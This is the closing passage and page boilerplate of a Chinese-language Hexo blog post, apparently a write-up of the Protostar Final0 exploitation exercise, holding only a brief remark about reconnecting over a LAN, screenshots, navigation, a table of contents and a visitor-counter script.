+<p><img src="https://i.imgur.com/yctTz06.png" alt=""></p>
+<p>如果在同一个局域网内并且知道这台机器的ip的话(<code>ip addr</code>)，也可以在外面用同一个脚本进行连接，改一下ip就行了</p>
+<p><img src="https://i.imgur.com/Ijr8ksM.png" alt=""></p>
+<p><img src="https://i.imgur.com/40r4Dx2.png" alt=""></p>
+<p>nice~</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Binary-Hacking/" rel="tag"># Binary-Hacking</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/02/Liveoverflow-0x19-net0-2/" rel="next" title="Liveoverflow-0x19-net0~2">
+                <i class="fa fa-chevron-left"></i> Liveoverflow-0x19-net0~2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/30/Pwnable-kr/" rel="prev" title="Pwnable.kr[Toddler's Bottle]">
+                Pwnable.kr[Toddler's Bottle] <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Protostar-Final0"><span class="nav-number">1.</span> <span class="nav-text">Protostar Final0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.1.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次分析"><span class="nav-number">4.</span> <span class="nav-text">再次分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#再次解题"><span class="nav-number">5.</span> <span class="nav-text">再次解题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
